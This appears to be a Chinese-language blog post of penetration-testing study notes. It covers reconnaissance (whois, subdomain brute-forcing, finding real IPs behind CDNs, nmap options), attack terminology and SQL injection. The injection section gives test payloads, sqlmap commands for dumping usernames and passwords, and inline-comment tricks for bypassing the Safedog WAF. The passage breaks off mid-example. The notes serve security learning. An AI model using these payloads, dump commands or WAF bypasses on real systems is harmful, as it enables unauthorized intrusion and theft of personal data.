title="信息收集"></a>信息收集</h2><p>主要收集服务器的配置信息和网站的敏感信息，其中包括：</p><ul><li>域名以及子域名信息</li><li>目标网站系统</li><li>cms指纹</li><li>目标网站真实IP</li><li>开放的端口等。</li></ul><p>信息收集的方式可分为<code>主动</code>和<code>被动</code>两种。</p><p><code>主动信息收集</code>：与目标主机进行直接交互，从而拿到目标信息。（比如黑进目标主机）</p><p><code>被动信息收集</code>：间接交互，通过搜索引擎或社会工程等方式间接获取目标主机上的信息。（比如Google搜索、Shodan搜索等）</p><h3 id="①域名信息的收集"><a href="#①域名信息的收集" class="headerlink" title="①域名信息的收集"></a>①域名信息的收集</h3><p>确定了要渗透的目标，即确定了其域名。</p><p>确定了域名之后还需要确定域名对应的<code>IP地址</code>，域名的<code>whois</code>信息、<code>子域名</code>等一系列与域名相关的信息。</p><h4 id="1、域名的whois信息"><a href="#1、域名的whois信息" class="headerlink" title="1、域名的whois信息"></a>1、域名的whois信息</h4><p><code>whois</code>是用来查询域名的<code>IP地址</code>以及所有者等信息的传输协议。</p><p>通常，执行whois查询的工具是：</p><p><a href="https://www.zhanid.com/tool/whois.html">whois查询工具—站长工具网</a></p><p><a href="https://tools.wujingquan.com/whois/">whois信息查询-站长工具</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240707164136300.png" alt="image-20240707164136300"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240707165721514.png" alt="image-20240707165721514"></p><p>其它的注入阿里云的域名查询在线工具也可以，就是显示出来的信息没有那么集中。</p><p>在kali下，也有默认的<code>whois工具指令</code>。</p><p>查询命令为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">whois 域名（.com）<br></code></pre></td></tr></table></figure><h4 id="2、备案信息查询"><a href="#2、备案信息查询" class="headerlink" title="2、备案信息查询"></a>2、备案信息查询</h4><p>ICP备案信息查询。</p><p>查询网址：</p><p><a href="https://icp.chinaz.com/">ICP备案查询-站长工具</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709134232544.png" alt="image-20240709134232544"></p><p><a href="https://beian.miit.gov.cn/#/Integrated/index">工信部ICP备案查询</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709134434241.png" alt="image-20240709134434241"></p><p>可以从中得到一些有关于网址或者域名的一些备案号、主办单位、网站负责人之类的信息。</p><h4 id="3、子域名信息"><a href="#3、子域名信息" class="headerlink" title="3、子域名信息"></a>3、子域名信息</h4><p>查询子域名的几种方法如下：</p><ul><li>Layer子域名爆破机</li></ul><p>Layer是win下的一款子域名探测工具，其工作原理是：利用<code>子域名字典</code>进行爆破。</p><p>输入目标网站的域名即可启动进行字典爆破子域名。如下是访问gxu官网域名爆破得到的子域名结果。</p><p>工具地址：<code>E:\IDEToolsV2\Layer子域名挖掘机4.2纪念版</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709135535182.png" alt="image-20240709135535182"></p><ul><li>subDomainsBurte</li></ul><p>它同样也是一个子域名爆破工具，使用<code>字典暴力</code>破解，并通过<code>DNS解析</code>来确定是否存在有效的子域名。它的特点是可以用小字典递归地发现三级域名、四级域名、甚至是五级域名等不容易被探测到的域名。</p><p>工具下载链接： <a href="https://github.com/lijiejie/subDomainsBrute%EF%BC%88%E5%8F%AF%E4%BD%BF%E7%94%A8pip%E5%AE%89%E8%A3%85%EF%BC%89">https://github.com/lijiejie/subDomainsBrute（可使用pip安装）</a></p><p>也可以在kali下安装使用哦。</p><p>使用默认下载源的话可能速度较慢而且可能会失败，所以我们可以使用镜像源下载。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip3 install -i https://pypi.tuna.tsinghua.edu.cn/simple dnspython==2.2.1 async_timeout<br></code></pre></td></tr></table></figure><p>在kali主机内部暂时下载失败。</p><p>通过远程连接下载也是失败：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709142722978.png" alt="image-20240709142722978"></p><p>由错误信息可以略知一二，kali系统中本来就有<code>dnspython</code>，所以试图再次下载的时候就会报错。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709142938308.png" alt="image-20240709142938308"></p><p>所以就直接先下载那个GitHub文件。</p><p><a href="https://blog.csdn.net/m0_57206390/article/details/133201540">kali 安装使用subDomainsBrute</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/lijiejie/subDomainsBrute.git<br></code></pre></td></tr></table></figure><p>这里远程终端下载一直发生错误，在kali内部尝试访问浏览器，也不行，然后更改了代理设置为使用系统自定义的代理，但是在远程终端还是不行。去到kali本机访问目标链接，发现可以访问到，然后直接在里边下载了。成功了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709150649237.png" alt="image-20240709150649237"></p><p>进入到目标文件夹安装依赖包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install dnspython gevent<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709150903081.png" alt="image-20240709150903081"></p><p>启动方式为：进入到<code>subDomainsBrute</code>文件夹下，执行启动代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 subDomainsBrute.py gxu.edu.com（域名）<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709151237123.png" alt="image-20240709151237123"></p><p>爆破速度远比Layer慢。</p><ul><li>Google查询</li></ul><p>使用语法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">site:域名<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709151514907.png" alt="image-20240709151514907"></p><p>本来也可以使用<code>FOFA</code>的，但是它并不是免费使用哈哈。</p><h4 id="4、http证书查询"><a href="#4、http证书查询" class="headerlink" title="4、http证书查询"></a>4、http证书查询</h4><p><a href="https://crt.sh/">http证书查询</a></p><p>可以输入域名，查询与其绑定的相关证书信息。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709152136780.png" alt="image-20240709152136780"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709152056475.png" alt="image-20240709152056475"></p><h4 id="5、DNS记录查询"><a href="#5、DNS记录查询" class="headerlink" title="5、DNS记录查询"></a>5、DNS记录查询</h4><p>DNS指的是域名解析服务，即将域名与IP之间做相应的转换。</p><blockquote><p>正向解析：根据域名查找对应的IP地址</p><p>反向解析：根据IP地址查找对应的域名</p></blockquote><ul><li><p>kali工具（DNSenum、Fierce、DMitry）</p></li><li><p>在线查询工具：</p><p><a href="http://tool.chinaz.com/dns/">站长工具之DNS查询</a></p><p>查询的效果是这样的：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709154255324.png" alt="image-20240709154255324"></p><p><a href="https://www.virustotal.com/gui/home/search">国外的DNS查询工具</a></p><p>界面良好直观，而且经过测试应该也是免费的。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709154740043.png" alt="image-20240709154740043"></p></li></ul><h4 id="6、判断域名对应的IP地址"><a href="#6、判断域名对应的IP地址" class="headerlink" title="6、判断域名对应的IP地址"></a>6、判断域名对应的IP地址</h4><p>首先需要判断域名是否存在CDN的情况。可以先去在线CDN查询网站进行查询。</p><p><a href="https://ping.chinaz.com/">在线CDN查询</a></p><p>如果输入域名查询得到的IP地址不止一个的话，那就说明该IP地址不是真实的服务器地址。<code>如果是两个或者三个IP地址，并且这些IP地址是同一个地区不同运营商的话，则这些IP地址很有可能是服务器的出口地址，该服务器在内网中</code></p><p>现在下面查询的这个域名，他只有一个对应的IP地址，说明该IP地址就是该域名的真实服务器地址，不存在CDN的情况。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709161318682.png" alt="image-20240709161318682"></p><p>如何绕过CDN查找网站的真实IP呢？</p><ul><li><p>很多时候一些重要的站点会做CDN，但是它旗下的一些子域名站点不会做CDN。可以从子域名切入查找网站的真实IP。<code>启动终端，在终端中使用ping命令。执行 ping 子域名 的命令，ping返回结果中会返回该子域名的IP地址</code>。 </p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709162401797.png" alt="image-20240709162401797"></p></li></ul><blockquote><p>CDN（内容分发网络）是构建在现有互联网基础之上的一层智能虚拟网络。</p></blockquote><h3 id="②整站分析"><a href="#②整站分析" class="headerlink" title="②整站分析"></a>②整站分析</h3><p>分析的对象有：</p><ul><li><p>服务器类型：windows、linux</p><blockquote><p>ping探测：win的TLS值一般是128，linux的则一般是64。</p><p>nmap扫描：<code>namp -O/-A IP地址</code>一般都能扫描得出来。</p></blockquote></li><li><p>网站容器：apache、nginx、tomcat、IIS等</p></li><li><p>脚本类型：php、jsp、asp、aspx</p></li><li><p>数据库类型：mysql、oracle、access、sqlserver</p></li></ul><p>在之前进行靶场攻打的过程中，有关于分析网站技术构成的指纹工具（如wappalyzer）就很适合用于整站分析（网站容器、脚本类型、数据库类型）。</p><p><strong>几种数据库的区别：</strong></p><blockquote><ul><li>Access：小型数据库，数据库后缀名：.mdb。一般是asp网页文件使用这个数据库</li><li>SQL Server：比较大型的数据库，端口号为1433，数据库后缀名：.mdf</li><li>MySQL：大部分是PHP页面，默认端口号是3306</li><li>Oracle：常用于比较大型的网站，默认端口是1521</li></ul></blockquote><p>常见搭配：</p><p>asp、aspx：access、sqlserver</p><p>php：mysql、postgreSQL</p><p>jsp：Oracle、mysql</p><h3 id="③企业信息查询"><a href="#③企业信息查询" class="headerlink" title="③企业信息查询"></a>③企业信息查询</h3><p>确认了公司之后，可以去互联网上查询与该公司有关的任何信息。如：企业基本信息、员工信息（手机号、邮箱、姓名、社交账号信息等）、组织框架、企业法人、企业综合信息等。使用社会工程学攻击获取这些信息也不是不行（在合法报备情况下哈）。</p><p><a href="https://www.tianyancha.com/">天眼查</a></p><p><a href="https://www.qcc.com/">企查查</a></p><p>也可以通过之前得ICP备案查询去获取一些信息。</p><h3 id="④GitHub信息收集"><a href="#④GitHub信息收集" class="headerlink" title="④GitHub信息收集"></a>④GitHub信息收集</h3><p>亲测，做毕设的时候在GitHub上找项目，找到了一个包含一万七条的员工入职个人信息。确实有这个必要进行GitHub信息收集。</p><p>主要收集：泄露源码、泄露数据库&#x2F;邮箱&#x2F;ftp&#x2F;ssh&#x2F;3389等账号、泄露的人员信息以及其它敏感信息。</p><p><a href="https://blog.csdn.net/qq_36119192/article/details/99690742">信息收集之Github搜索语法</a></p><h3 id="⑤端口扫描"><a href="#⑤端口扫描" class="headerlink" title="⑤端口扫描"></a>⑤端口扫描</h3><h4 id="1、nmap端口扫描"><a href="#1、nmap端口扫描" class="headerlink" title="1、nmap端口扫描"></a>1、nmap端口扫描</h4><ul><li><p>功能：主机发现（检测存活在网络上的主机）、端口发现（检测开放端口）、服务发现（检测端口开放的服务和其版本）、检测操作系统&#x2F;硬件地址&#x2F;软件版本等、检测脆弱性漏洞（<code>--script=vuln</code>）</p></li><li><p>常用命令：</p></li></ul><blockquote><p>-sS：tcp syn扫描</p><p>-p：指定端口号扫描</p><p>-v：显示扫描过程</p><p>-F：快速扫描</p><p>-A：全面扫描</p><p>-Pn：禁止ping后扫描，跳过主机发现的过程进行端口扫描</p><p>-sU：udp扫描</p><p>-sT：tcp扫描</p><p>-sV：扫描系统版本和程序版本号检测</p><p>-n：禁止反向域名解析</p><p>-R：启用反向域名解析</p><p>-6：启用IPV6扫描</p><p>–script&#x3D;vuln：全面的漏洞扫描</p></blockquote><h4 id="2、旁站和c段扫描"><a href="#2、旁站和c段扫描" class="headerlink" title="2、旁站和c段扫描"></a>2、旁站和c段扫描</h4><p>旁站是指和目标网站在同一台服务器上的其它网站。拿webshell，提权，拿下该网站。</p><p>使用IP反查域名搜索旁站：</p><p><a href="http://s.tool.chinaz.com/same">IP反查域名</a></p><p><a href="https://www.aizhan.com/">SEO综合查询·反查域名</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709230713348.png" alt="image-20240709230713348"></p><p>对红蓝对抗和护网，c段扫描比较有意义。c段是指与目标服务器IP处于同一个C段的其它服务器。（192.168.1.0&#x2F;24）</p><h3 id="⑥网站敏感目录和文件"><a href="#⑥网站敏感目录和文件" class="headerlink" title="⑥网站敏感目录和文件"></a>⑥网站敏感目录和文件</h3><p>通常我们所说的敏感文件、敏感目录大概有以下几种：</p><blockquote><p>后台、robots.txt、数据库.log、sitemap.xml、mysql.sql、licence.txt、Git、hg&#x2F;Mercurial、svn&#x2F;Subversion、bzr&#x2F;Bazaar、Cvs、WEB-INF泄露、备份文件泄露、配置文件泄露。</p></blockquote><ul><li>Cansina</li></ul><p>用于发现网站的敏感目录和内容的安全测试工具，通过分析服务器的响应进行探测并使用sqlite保证数据持久性。</p><p>下载地址：<a href="https://github.com/deibit/cansina">https://github.com/deibit/cansina</a></p><ul><li>Githack</li></ul><p>git泄露利用脚本</p><p>下载地址：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><h2 id="威胁建模"><a href="#威胁建模" class="headerlink" title="威胁建模"></a>威胁建模</h2><p>利用上一个信息收集阶段获取的信息进行攻击规划。</p><p>标识目标组织可能存在的漏洞与缺陷，根据威胁模型确定下一步需要搜集的信息和攻击方法。</p><h2 id="渗透攻击"><a href="#渗透攻击" class="headerlink" title="渗透攻击"></a>渗透攻击</h2><p><a href="https://github.com/Getshell/LinuxTQ">linux提权方法论</a></p><h3 id="①对象"><a href="#①对象" class="headerlink" title="①对象"></a>①对象</h3><h4 id="1、CMS"><a href="#1、CMS" class="headerlink" title="1、CMS"></a>1、CMS</h4><p>内容管理系统，用于快速统一创建网站。许多使用CMS构建的网站均存在着对应的漏洞。比如，WordPress 是著名的个人网站CMS，之前我们进行靶场的攻打的时候发现它存在着不少可以被利用来提权的漏洞。</p><blockquote><p>常见的CMS网站平台有：</p><ul><li>WordPress</li><li>HubSpot</li><li>Joomla</li><li>WooCommerce</li><li>Drupal</li><li>Wix</li><li>BigCommerce</li><li>Shopify</li><li>ghost</li><li>Magento</li><li>Textpattern</li><li>Blogger</li><li>Bitrix24</li><li>TYPO3</li></ul></blockquote><p>可以通过<code>metasploit</code>、<code>searchsploit</code>等来搜索有关特定CMS平台的漏洞并尝试进行利用。</p><h4 id="2、中间件"><a href="#2、中间件" class="headerlink" title="2、中间件"></a>2、中间件</h4><p>中间件是一种独立的系统软件或服务程序，位于客户机&#x2F;服务器的操作系统之上，管理计算机资源和网络通讯，是连接两个独立应用程序或独立系统的软件。</p><p>常见的中间件有：<code>IIS、apache、ngnix、weblogic等</code>。</p><p>中间件本身并不能用来Getshell或提权。而且其一般不是以root用户启动的。但是，在特定条件下（比如存在一些安全漏洞）可以被利用来实施攻击。</p><blockquote><p>常见的三种架构：</p><ul><li>ASP &#x3D; windows + IIS + SQL Server&#x2F;Access + ASP</li><li>J2EE &#x3D; UNIX + Tomcat + Oracle + JSP</li><li>LAMP &#x3D; Linux + Apache + MySql + php</li></ul></blockquote><h4 id="3、后门"><a href="#3、后门" class="headerlink" title="3、后门"></a>3、后门</h4><p>后门是指黑客为了对主机进行长期的控制，在机器上种植的一段程序或留下的一个“入口”。</p><p>如何检测机器上的后门，主要是通过后门扫描工具来进行。比如，BackdoorBox、</p><p><a href="https://www.freebuf.com/articles/network/356576.html">常见系统后门技术总结与分析利用</a></p><p>一般来说，我们可以通过植入后门对目标主机进行监控。具体的就先不深入探究了。</p><h4 id="4、webshell"><a href="#4、webshell" class="headerlink" title="4、webshell"></a>4、webshell</h4><p>指网站后门。它通过web服务进行命令执行。</p><h3 id="②目标"><a href="#②目标" class="headerlink" title="②目标"></a>②目标</h3><h4 id="1、Getshell"><a href="#1、Getshell" class="headerlink" title="1、Getshell"></a>1、Getshell</h4><p>即<code>获取目标的命令执行权限</code>。</p><blockquote><p>shell，简单来说就是“为使用者提供操作页面”的命令解释器。</p></blockquote><h4 id="2、提权"><a href="#2、提权" class="headerlink" title="2、提权"></a>2、提权</h4><p>操作系统低权限的账户将自己提升为管理员权限使用的方法。</p><p><a href="https://www.cnblogs.com/sfsec/p/15163907.html">linux提权总结</a></p><h4 id="3、相关术语"><a href="#3、相关术语" class="headerlink" title="3、相关术语"></a>3、相关术语</h4><blockquote><ul><li>肉鸡：被黑客入侵并被长期驻扎的计算机或服务器。可以随意控制，可以是任意系统的设备，对象可以是企业，个人，政府等等所有单位。</li><li>抓鸡：利用程序的漏洞，使用自动化方式获取存在漏洞的行为。</li><li>撞库：撞库是黑客通过收集互联网已泄露的用户和密码信息，生成对应的字典表，尝试批量登陆其他网站后，得到一系列可以登录的用户。</li><li>拖库：拖库本来是数据库领域的术语，指从数据库中导出数据。到了黑客攻击泛滥的今天，它被用来指网站遭到入侵后，黑客窃取其数据库。</li><li>POC：全称”Proof of Concept”（ 概念验证），常指一段漏洞证明的代码。</li><li>EXP：全称”Exploit”（利用），指利用系统漏洞进行攻击的动作。</li><li>Payload：“有效载荷”，指成功exploit之后，真正在目标系统执行的代码&#x2F;指令。</li><li>ShellCode：“shell代码”，是Payload的一种，因其建立正向&#x2F;反向shell而得名。</li><li>APT攻击：Advanced Persistent Threat ，高级可持续性攻击，是指组织或者小团体利用先进的攻击手段对特定目标进行长期持续性网络攻击的攻击形式。（具有极强的隐蔽性、潜伏期长、持续性强、目标性强）。</li></ul></blockquote><h2 id="基础漏洞"><a href="#基础漏洞" class="headerlink" title="基础漏洞"></a>基础漏洞</h2><h3 id="①SQL注入"><a href="#①SQL注入" class="headerlink" title="①SQL注入"></a>①SQL注入</h3><blockquote><p>SQL注入攻击（SQL injection），简称注入攻击，是发生于应用程序之数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，当设计不良的程序忽略了检查，那么这些注入进去的指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到攻击。</p></blockquote><h4 id="1、先验知识"><a href="#1、先验知识" class="headerlink" title="1、先验知识"></a>1、先验知识</h4><ul><li><h5 id="Mysql的三种注释风格："><a href="#Mysql的三种注释风格：" class="headerlink" title="Mysql的三种注释风格："></a>Mysql的三种注释风格：</h5></li></ul><blockquote><p>单行注释：<code>#</code>后面直接添加注释内容</p><p>​  <code>--</code>后面直接添加注释内容</p><p>多行注释：<code>/*中间可跨行*/</code>于中间添加注释内容</p><p>内联注释：MySql为了保持于其它数据库兼容，避免从mysql中导出的sql语句不能被其它数据库使用。它将mysql中特有的语句放在了<code>/*！content*/</code>中，这些语句在不兼容的数据库中使用时便不会被执行，而mysql自身却能识别。</p><p>在SQL注入中，内联注释常用来绕过waf。</p></blockquote><ul><li><h5 id="Union联合查询："><a href="#Union联合查询：" class="headerlink" title="Union联合查询："></a>Union联合查询：</h5></li></ul><blockquote><p>Union操作符用于拼接两个或者多select查询语句</p><p>Union中的每个查询必须拥有相同的列数</p></blockquote><ul><li><h5 id="Order-by语句："><a href="#Order-by语句：" class="headerlink" title="Order by语句："></a>Order by语句：</h5></li></ul><blockquote><p>Order by语句用于根据指定的列对结果集进行排序</p><p>默认按照升序对记录进行排序</p></blockquote><ul><li><h5 id="SQL注入中常用的Mysql语句："><a href="#SQL注入中常用的Mysql语句：" class="headerlink" title="SQL注入中常用的Mysql语句："></a>SQL注入中常用的Mysql语句：</h5></li></ul><blockquote><p>user()当前用户名</p><p>database()当前所有数据库</p><p>current_user()当前用户名（可用来查看权限）</p><p>version()数据库版本</p><p>@@datadir数据库路径</p><p>load_file()读文件操作</p><p>into outfile() &#x2F; into dumpfile()写文件操作</p></blockquote><ul><li><h5 id="sql注入读写文件的条件"><a href="#sql注入读写文件的条件" class="headerlink" title="sql注入读写文件的条件"></a>sql注入读写文件的条件</h5></li></ul><blockquote><p>数据库允许导入导出（secure_file_priv）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; show variables like <span class="hljs-string">&quot;secure_file_priv&quot;</span>;<br></code></pre></td></tr></table></figure><p>当前用户文件操作权限（File_priv）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; <span class="hljs-keyword">select</span> File_priv from mysql.user <span class="hljs-built_in">where</span> user=<span class="hljs-string">&#x27;root&#x27;</span> and host=<span class="hljs-string">&#x27;localhost&#x27;</span>;<br></code></pre></td></tr></table></figure></blockquote><ul><li><h5 id="SQL注入漏洞的判断依据"><a href="#SQL注入漏洞的判断依据" class="headerlink" title="SQL注入漏洞的判断依据"></a>SQL注入漏洞的判断依据</h5></li></ul><blockquote><p>构建测试语句</p><p>提交请求</p><p>分析返回结果</p><p>①符合预期结果，则存在SQL注入漏洞</p><p>②不符合预期结果，则可以判断为不存在SQL注入漏洞，当然也可以再次构造测试语句进行进一步的测试。</p></blockquote><ul><li><h5 id="SQL注入漏洞的类型"><a href="#SQL注入漏洞的类型" class="headerlink" title="SQL注入漏洞的类型"></a>SQL注入漏洞的类型</h5></li></ul><blockquote><p>通常分为两种：数字型、字符型</p></blockquote><h4 id="2、SQL注入技术"><a href="#2、SQL注入技术" class="headerlink" title="2、SQL注入技术"></a>2、SQL注入技术</h4><blockquote><p>主要分为三种注入技术：</p><ul><li>基于报错注入（Error-based）</li><li>基于Union联合查询注入</li><li>基于盲注（Bind SQL injection）</li></ul></blockquote><ul><li><h5 id="基于报错注入（Error-based）"><a href="#基于报错注入（Error-based）" class="headerlink" title="基于报错注入（Error-based）"></a>基于报错注入（Error-based）</h5></li></ul><p><code>用法</code>：构造错误的SQL命令将注入信息在数据库错误信息中显示出来。</p><p><code>条件</code>：需要根据不同数据库的错误处理机制以及脚本语言错误处理机制构造。</p><p><code>注意</code>：有字节数限制，可将注入的字符串信息拆分显示。</p><p><code>特点</code>：效率高。</p><ul><li><h5 id="基于Union联合查询注入"><a href="#基于Union联合查询注入" class="headerlink" title="基于Union联合查询注入"></a>基于Union联合查询注入</h5></li></ul><p><code>用途</code>：用于合并两个或多个select语句的结果集。</p><p><code>用法</code>：<code>union select column_name(s) from table_name1</code></p><p><code>注意</code>：union内部的select语句必须拥有相同数量的列，列也必须拥有相似的数据类型。默认union操作符选取不同的值。(如果允许重复的值，则使用<code>union all</code>)</p><p><code>特点</code>：效率高，可一次批量查询大量数据。</p><ul><li><h5 id="基于盲注（Bind-SQL-injection）"><a href="#基于盲注（Bind-SQL-injection）" class="headerlink" title="基于盲注（Bind SQL injection）"></a>基于盲注（Bind SQL injection）</h5></li></ul><p><code>用途</code>：在无法通过显示位和错误信息获取目标数据时，根据注入语句返回的true、false的结果页面不同暴力猜解目标数据。</p><p><code>用法</code>：<code>使用条件语句，如 if 、 case when等</code></p><p><code>特点</code>：暴力猜解，速度慢，效率低。</p><h4 id="3、SQL注入实操"><a href="#3、SQL注入实操" class="headerlink" title="3、SQL注入实操"></a>3、SQL注入实操</h4><p><a href="https://www.freebuf.com/articles/web/339118.html">浅谈Sql注入总结笔记整理(超详细)</a></p><p><a href="https://www.cnblogs.com/dhan/p/18290502">SQL注入基础入门-详细</a></p><h5 id="判断是否存在SQL注入"><a href="#判断是否存在SQL注入" class="headerlink" title="判断是否存在SQL注入"></a>判断是否存在SQL注入</h5><blockquote><p>有个注意的点：url后面必须是可注入的参数?id&#x3D;之类的，否则url检测会有问题。</p></blockquote><ul><li><strong>单引号判断法：</strong></li></ul><p>在参数（通常为网页URL）后面加上单引号（英文），重新加载网页。</p><blockquote><p>如果页面返回错误，则表示存在SQL注入。（无论是字符型还是整型都会因为单引号个数不匹配而报错）</p><p>如果未报错，也无法断定不存在SQL注入。（可能页面对单引号设置了过滤，此时可以使用判断语句进行注入）</p></blockquote><h5 id="SQL注入类型判断"><a href="#SQL注入类型判断" class="headerlink" title="(SQL注入类型判断)"></a>(SQL注入类型判断)</h5><ul><li><strong>数字型判断</strong></li></ul><blockquote><p>‘select * from <tablename> where id &#x3D; x’</p><p>当输入的参数 x 为整型时，通常在abc.php中的这种类型可以使用经典的<code>and 1=1</code>和<code>and 1=2</code>来进行判断：</p><p>url地址中输入<code>http://xxx/abc.php?id=x and 1=1</code>，若网页页面依旧运行正常，则继续执行下一步👇</p><p>url地址中输入<code>http://xxx/abc.php?id=x and 1=2</code>，页面运行错误，则说明此SQL注入为数字型注入。（换言之，如果仍然正常说明不是数字型SQL注入）</p></blockquote><ul><li><strong>字符型注入</strong></li></ul><blockquote><p>‘select * from <tablename> where id &#x3D; x’</p><p>当输入的参数 x 为字符型时，同样可以使用<code>and &#39;1&#39;=&#39;1</code>和<code>and &#39;1&#39;=&#39;2</code>来判断：</p><p>url地址中输入<code>http://xxx/abc.php?id=x and &#39;1&#39;=&#39;1</code>时，如果网页页面运行正常，则继续执行下一步👇</p><p>url地址中输入<code>http://xxx/abc.php?id=x and &#39;1&#39;=&#39;2</code>时，页面运行错误，则说明此SQL注入为字符型注入。</p></blockquote><ul><li><strong>sqlmap注入判断</strong></li></ul><p>当前面三种注入判断方法都尝试过，并且显示的界面都是正常的时候。此时我们仍无法断定其不存在SQL注入，可以再使用sqlmap进行扫描测试，如果再扫不出注入口的话，那有九成把握断定其不存在SQL注入。</p><p><a href="https://www.cnblogs.com/yy-123/p/16749289.html">SQLMap入门——判断是否存在注入</a></p><p><a href="https://www.cnblogs.com/wuhongbin/p/15582981.html">sqlmap使用手册（更直白款）</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 检测是否存在注入</span><br>sqlmap -u url<br><br><span class="hljs-comment"># 获取所有表名</span><br>sqlmap -u url --dbs<br><br><span class="hljs-comment"># 获取当前库名</span><br>sqlmap -u url --current-db<br><br><span class="hljs-comment"># 获取当前连接数据库的用户名    </span><br>sqlmap -u url --current-user<br><br><span class="hljs-comment"># 获取指定库的所有表名 -D 指定数据库</span><br>sqlmap -u url -D security --tables<br><br><span class="hljs-comment"># 获取指定库指定表的字段名 -T 指定表名</span><br>sqlmap -u url -D security -T <span class="hljs-built_in">users</span> --columns<br><br><span class="hljs-comment"># 获取指定库指定表指定字段的数据 -C 指定字段名</span><br>sqlmap -u url -D security -T <span class="hljs-built_in">users</span> -C <span class="hljs-built_in">id</span>,username,password --dump<br><br><span class="hljs-comment"># 清除缓存进行注入 (删除sqlmap的output文件夹也可清除缓存)</span><br>sqlmap -u url --purge<br></code></pre></td></tr></table></figure><h4 id="4、绕过安全狗（防SQL注入功能）"><a href="#4、绕过安全狗（防SQL注入功能）" class="headerlink" title="4、绕过安全狗（防SQL注入功能）"></a>4、绕过安全狗（防SQL注入功能）</h4><p>什么是安全狗？</p><blockquote><p>安全狗是一种网络安全服务，主要用于网站的防护和安全监测。具体来说，网站安全狗是一款集网站内容安全防护、网站资源保护及网站流量保护功能为一体的服务器工具。功能涵盖了网马&#x2F;木马扫描、防SQL注入、防盗链、防CC攻击、网站流量实时监控、网站CPU监控、下载线程保护、IP黑白名单管理、网页防篡改功能等模块。能够为用户提供实时的网站安全防护，避免各类针对网站的攻击所带来的危害。</p></blockquote><p><a href="https://cloud.tencent.com/developer/article/1705861">绕安全狗的那些事</a></p><p>由于安全狗是一款常用于网站安全保护的服务器工具，其包含了防SQL注入的功能。绕过安全狗的防SQL注入功能，顾名思义，便能够执行SQL注入了。</p><p>那么如果绕过安全狗中的防SQL注入模块呢？</p><blockquote><p>一般来说，安全狗不会对POST请求做检测，如果POST请求也被拦截的话，那就可以尝试进行分块传输。</p></blockquote><h5 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h5><p>内联注释符：<code>/*!...*/</code></p><p>绕过思路：</p><p>· 首先使用常规判断注入的方法（and 1&#x3D;1 或其它）判断类型。</p><p>· 如果被拦截，使用非·常规判断方法（and -1&#x3D;-1–+ 后面的<code>--+</code>是注释符）判断类型。</p><p>· 如果还是被拦截，那基本可以判断为<code>安全狗一般都会拦截 and+一些组合语句 </code>，</p><p>· 接下来可以使用<code>四则运算</code>判断，<code>/1返回正常页面，/0返回异常页面，则表示其为数字型注入</code>，如果是数字型注入的话，尝试使用<code>order by</code>绕过：</p><blockquote><p>输入：%20&#x2F;<em><strong><strong>!23144order</strong></strong></em>&#x2F;%20&#x2F;<em><strong><strong>!23144by</strong></strong></em>&#x2F;%201–+</p><p>%20表示空格</p><p>实际显示： 